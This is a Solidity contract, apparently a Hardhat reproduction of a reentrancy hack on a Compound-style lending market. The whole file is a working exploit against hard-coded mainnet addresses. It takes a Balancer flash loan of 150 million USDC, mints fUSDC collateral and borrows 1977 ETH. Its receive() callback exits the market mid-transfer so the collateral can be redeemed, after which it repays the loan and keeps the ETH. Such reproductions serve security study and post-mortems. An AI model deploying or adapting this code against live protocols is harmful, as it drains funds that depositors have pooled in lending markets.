// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;
import "./Interface.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract Exploit is IFlashLoanRecipient, Ownable {
    uint USDC_DECIMAL = 10**6;
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    ICEtherDelegate fEth =
        ICEtherDelegate(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));

    ICErc20Delegate fUsdc =
        ICErc20Delegate(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);

    IUnitroller comptroller =
        IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    IBalancerVault vault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function exploit() public onlyOwner {
        
        address[] memory tokens = new address[](1);

        tokens[0] = address(usdc);

        uint256[] memory amounts = new uint256[](1);

        amounts[0] = 150000000 * USDC_DECIMAL;

        vault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {

        uint256 usdcBalance = usdc.balanceOf(address(this));
        uint depositAmount = usdcBalance;

        console.log("usdc balance after flashloan: ", usdcBalance);
        usdc.approve(address(fUsdc), type(uint256).max);

        fUsdc.accrueInterest();

        //少一個0?
        fUsdc.mint(depositAmount);

        usdcBalance = usdc.balanceOf(address(this));

        console.log("USDC balance after minting", usdcBalance);

        address[] memory ctokens = new address[](1);

        ctokens[0] = address(fUsdc);

        comptroller.enterMarkets(ctokens);

        fEth.borrow(1977 ether);

        console.log(
            "ETH Balance of fEth_Pool after borrowing:",
            address(fEth).balance / 1e18
        );

        console.log(
            "ETH Balance of me after borrowing:",
            address(this).balance / 1e18
        );

        usdcBalance = usdc.balanceOf(address(this));

        fUsdc.approve(address(fUsdc), type(uint256).max);

        //少一個0?
        fUsdc.redeemUnderlying(depositAmount);

        usdcBalance = usdc.balanceOf(address(this));

        console.log("USDC balance after redeem", usdcBalance);

        usdc.transfer(address(vault), usdcBalance);

        usdcBalance = usdc.balanceOf(address(this));

        console.log("USDC balance after repayying flashloan", usdcBalance);
    }

    receive() external payable {
        comptroller.exitMarket(address(fUsdc));
    }
}
